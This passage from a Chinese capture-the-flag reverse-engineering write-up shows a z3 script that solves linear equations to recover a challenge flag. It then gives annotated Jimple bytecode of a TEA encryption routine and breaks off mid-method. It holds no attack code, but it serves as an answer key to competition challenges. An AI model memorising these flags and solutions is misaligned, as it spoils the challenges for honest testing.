class="hljs-number">531</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">782</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">502</span>==<span class="hljs-number">1044165</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">539</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">750</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">726</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">930</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">798</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">940</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">52</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">980</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">620</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">103</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">873</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">509</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">107</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">21</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">913</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">579</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">877</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">372</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">960</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">975</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">255</span>==<span class="hljs-number">1208007</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">265</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">171</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">419</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">27</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">298</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">784</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">273</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">570</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">189</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">711</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">905</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">88</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">463</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">848</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">598</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">675</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">796</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">153</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">983</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">460</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">638</span>==<span class="hljs-number">1014193</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">972</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">595</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">872</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">767</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">357</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">42</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">978</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">104</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">640</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">373</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">142</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">509</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">838</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">113</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">359</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">687</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">613</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">957</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">387</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">524</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">787</span>==<span class="hljs-number">1069708</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">35</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">354</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">49</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">280</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">824</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">686</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">555</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">635</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">130</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">278</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">928</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">728</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">39</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">608</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">941</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">37</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">39</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">136</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">470</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">86</span>==<span class="hljs-number">757483</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">413</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">464</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">795</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">567</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">587</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">303</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">218</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">594</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">770</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">822</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">140</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">780</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">730</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">521</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">286</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">368</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">737</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">344</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">73</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">72</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">53</span>==<span class="hljs-number">904238</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">703</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">574</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">758</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">976</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">65</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">231</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">292</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">601</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">783</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">83</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">726</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">413</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">837</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">779</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">803</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">503</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">675</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">230</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">365</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">604</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">102</span>==<span class="hljs-number">1032025</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">20</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">381</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">303</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">396</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">155</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">721</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">934</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">467</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">798</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">250</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">979</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">959</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">945</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">894</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">143</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">601</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">298</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">273</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">373</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">386</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">364</span>==<span class="hljs-number">1049473</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">224</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">850</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">379</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">209</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">112</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">127</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">740</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">714</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">295</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">506</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">632</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">444</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">121</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">174</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">792</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">216</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">47</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">453</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">589</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">898</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">482</span>==<span class="hljs-number">830787</span>)<br><br>s.check()<br>m = s.model()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(m[i].as_long()),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># SBCTF&#123;EquaTion1Seasy&#125;</span><br></code></pre></td></tr></table></figure><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>简单的字节码阅读，是个经典的TEA算法加密，不过需要注意的是这里的运算都是有符号的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><code class="hljs jimple">public class simple extends java.lang.Object<br>&#123;<br><br>    public void &lt;init&gt;()<br>    &#123;<br>        simple r0;<br><br>        r0 := @this: simple;<br><br>        specialinvoke r0.&lt;java.lang.Object: void &lt;init&gt;()&gt;();<br><br>        return;<br>    &#125;<br><br>    private static int[] method1(byte[])<br>    &#123;<br>        byte[] r0;<br>        int $i0, $i1, $i2, $i3, $i5, $i6, $i8, $i9, $i10, $i12, $i13, $i14, $i16, $i17, $i18, i19, i20;<br>        int[] r1;<br>        byte $b4, $b7, $b11, $b15;<br><br>        r0 := @parameter0: byte[];                                //参数 字节数组<br><br>        $i0 = lengthof r0;<br><br>        $i1 = $i0 &gt;&gt; 2;                                           //字节数组长度 / 4<br><br>        r1 = newarray (int)[$i1];<br><br>        i19 = 0;<br><br>        i20 = 0;<br><br>     label1:<br>        $i2 = lengthof r0;<br><br>        if i20 &gt;= $i2 goto label2; //i20索引<br><br>        $i3 = i20 + 3;<br><br>        $b4 = r0[$i3];                                            // b4 = r0[i+3]<br><br>        $i5 = staticinvoke &lt;simple: int method4(byte)&gt;($b4);<br><br>        $i6 = i20 + 2;<br><br>        $b7 = r0[$i6];                                            // b7 = r0[i+2]<br><br>        $i8 = staticinvoke &lt;simple: int method4(byte)&gt;($b7);<br><br>        $i9 = $i8 &lt;&lt; 8;                                           //i9 = r0[i+2] &lt;&lt; 8<br><br>        $i12 = $i5 | $i9;                                         // i12 = (r0[i+2] &lt;&lt; 8) | r0[i+3] <br><br>        $i10 = i20 + 1;<br><br>        $b11 = r0[$i10];<br><br>        $i13 = staticinvoke &lt;simple: int method4(byte)&gt;($b11);<br><br>        $i14 = $i13 &lt;&lt; 16;                                       <br><br>        $i17 = $i12 | $i14;                                     // i17 =  (r0[i+1] &lt;&lt; 16 )| (r0[i+2] &lt;&lt; 8) | r0[i+3]<br><br>        $b15 = r0[i20];<br><br>        $i16 = $b15 &lt;&lt; 24;<br><br>        $i18 = $i17 | $i16;                                    // i18 = (r0[i+0] &lt;&lt; 24 )| (r0[i+1] &lt;&lt; 16 )| (r0[i+2] &lt;&lt; 8) | r0[i+3]<br><br>        r1[i19] = $i18;                                       // r1[j] = i18<br><br>        i19 = i19 + 1;                                        // j += 1<br><br>        i20 = i20 + 4;                                        // i += 4<br><br>        goto label1;<br><br>     label2:<br>        return r1;<br>    &#125;<br><br>    private static byte[] method2(int[])<br>    &#123;<br>        int[] r0;<br>        int $i0, $i1, $i2, $i3, $i4, $i6, $i7, $i8, $i9, $i11, $i12, $i13, $i14, $i16, $i17, $i18, $i19, i21, i22;<br>        byte[] r1;<br>        byte $b5, $b10, $b15, $b20;<br><br>        r0 := @parameter0: int[];                              // 参数 r0 整形数组<br><br>        $i0 = lengthof r0;<br><br>        $i1 = $i0 &lt;&lt; 2;                                        // 整形数组长度 * 4<br><br>        r1 = newarray (byte)[$i1];<br><br>        i21 = 0;<br><br>        i22 = 0;<br><br>     label1:<br>        $i2 = lengthof r1;                                     // i2 整形数组长度<br><br>        if i22 &gt;= $i2 goto label2;<br><br>        $i6 = i22 + 3;                                <br><br>        $i3 = r0[i21];<br><br>        $i4 = $i3 &amp; 255;<br><br>        $b5 = (byte) $i4;                    <br><br>        r1[$i6] = $b5;                                         // r1[i+3] = r0[i21] &amp; 0xff<br><br>        $i11 = i22 + 2;<br><br>        $i7 = r0[i21];<br><br>        $i8 = $i7 &gt;&gt; 8;<br><br>        $i9 = $i8 &amp; 255;<br><br>        $b10 = (byte) $i9;<br><br>        r1[$i11] = $b10;                                      // r1[i+2] = (r0[i21] &gt;&gt; 8) &amp; 0xff<br><br>        $i16 = i22 + 1;<br><br>        $i12 = r0[i21];<br><br>        $i13 = $i12 &gt;&gt; 16;<br><br>        $i14 = $i13 &amp; 255;<br><br>        $b15 = (byte) $i14;<br><br>        r1[$i16] = $b15;                                       // r1[i+1] = (r0[i21] &gt;&gt; 16) &amp; 0xff<br><br>        $i17 = r0[i21];<br><br>        $i18 = $i17 &gt;&gt; 24;<br><br>        $i19 = $i18 &amp; 255;<br><br>        $b20 = (byte) $i19;<br><br>        r1[i22] = $b20;                                        // r1[i] = (r0[i21] &gt;&gt; 24) &amp; 0xff<br><br>        i21 = i21 + 1;                                         // i21 += 1<br><br>        i22 = i22 + 4;                                         // i += 4<br><br>        goto label1;<br><br>     label2:<br>        return r1;<br>    &#125;<br><br>    public static byte[] method3(byte[], int[])<br>    &#123;<br>        byte[] r0, $r2;<br>        int[] r1, r3;<br>        int $i0, $i1, $i4, $i5, $i6, $i7, $i8, $i9, $i10, $i11, $i12, $i13, $i14, $i15, $i16, $i17, $i18, $i19, $i20, $i21, $i22, i23, i24, i25, i26, i27;<br><br>        r0 := @parameter0: byte[];                                // 参数 字节数组 r0<br><br>        r3 := @parameter1: int[];                                 // 参数 整形数组 r3  Tea的key数组<br><br>        r1 = staticinvoke &lt;simple: int[] method1(byte[])&gt;(r0);   // 调用method1 得到整形数组r1<br><br>        i23 = 0;<br><br>     label1:<br>        $i0 = lengthof r1;                                        // i0 整形数组r1长度<br><br>        if i23 &gt;= $i0 goto label4;                                // i23索引 <br><br>        i24 = r1[i23];                                            // i24 = r1[i] v1<br><br>        $i1 = i23 + 1;<br><br>        i25 = r1[$i1];                                            // i25 = r1[i+1] v2<br><br>        i26 = 0;<br><br>        i27 = 0;<br><br>     label2:<br>        if i27 &gt;= 32 goto label3;                                // i27 第二层循环次数 k<br><br>        i26 = i26 + -1640531527;                                 // i26 delta += -1640531527<br><br>        $i6 = i25 &lt;&lt; 4;                                          // i6 = v2 &lt;&lt; 4<br><br>        $i5 = r3[0];                                             // i5 = key[0]<br><br>        $i8 = $i6 + $i5;                                         // i8 = (v2 &lt;&lt; 4) + key[0]<br><br>        $i7 = i25 + i26;                                         // i7 = v2 + delta<br><br>        $i12 = $i8 ^ $i7;                                        // i12 = ((v2 &lt;&lt; 4) + key[0]) ^ (v2 + delta)<br><br>        $i10 = i25 &gt;&gt; 5;                                         // i10 = v2 &gt;&gt; 5<br><br>        $i9 = r3[1];                                             // i9 = key[1]<br><br>        $i11 = $i10 + $i9;                                       // i11 = (v2 &gt;&gt; 5 )+key[1]<br><br>        $i13 = $i12 ^ $i11;                                      // i13 = (((v2 &lt;&lt; 4) + key[0]) ^ (v2 + delta)) ^ ((v2 &gt;&gt; 5 )+key[1])<br><br>        i24 = i24 + $i13;                                        // *** v1 += (((v2 &lt;&lt; 4) + key[0]) ^ (v2 + delta)) ^ ((v2 &gt;&gt; 5 )+key[1]) ***<br><br>        $i15 = i24 &lt;&lt; 4;                                         // i15 = v1 &lt;&lt; 4<br><br>        $i14 = r3[2];                                            // i14 = key[2]<br><br>        $i17 = $i15 + $i14;                                      // i17 = (v1 &lt;&lt; 4) + key[2]<br><br>        $i16 = i24 + i26;                                        // i16 = v1 + delta<br><br>        $i21 = $i17 ^ $i16;                                      // i21 = ((v1 &lt;&lt; 4) + key[2]) ^ (v1 + delta)<br><br>        $i19 = i24 &gt;&gt; 5;                                         // i19 = v1 &gt;&gt; 5<br><br>        $i18 = r3[3];                                            // i18 = key[3]<br><br>        $i20 = $i19 + $i18;                                      // i20 = (v1 &gt;&gt; 5) + key[3]<br><br>        $i22 = $i21 ^ $i20;                                      // i22 = (((v1 &lt;&lt; 4) + key[2]) ^ (v1 + delta)) ^ ((v1 &gt;&gt; 5) + key[3])<br><br>        i25 = i25 + $i22;                                        // *** v2 += (((v1 &lt;&lt; 4) + key[2]) ^ (v1 + delta)) ^ ((v1 &gt;&gt; 5) + key[3]) ***<br><br>        i27 = i27 + 1;                                           // k += 1<br><br>        goto label2;<br><br>     label3:<br>        r1[i23] = i24;                                           // result[i] = v1<br><br>        $i4 = i23 + 1;<br><br>        r1[$i4] = i25;                                            // result[i+1] = v2<br><br>        i23 = i23 + 2;<br><br>        goto label1;<br><br>     label4:<br>        $r2 = staticinvoke &lt;simple: byte[] method2(int[])&gt;(r1);   // 调用method2方法，将整形数组拆分为字节数组<br><br>        return $r2;<br>    &#125;<br><br>    private static int method4(byte)<br>    &#123;<br>        byte b0;<br>        int i1;<br><br>        b0 := @parameter0: byte;<br><br>        i1 = b0;<br><br>        if b0 &gt;= 0 goto label1;<br><br>        i1 = b0 + 256;<br><br>     label1:<br>        return i1;<br>    &#125;<br><br>    public static void main(java.lang.String[])<br>    &#123;<br>        int[] 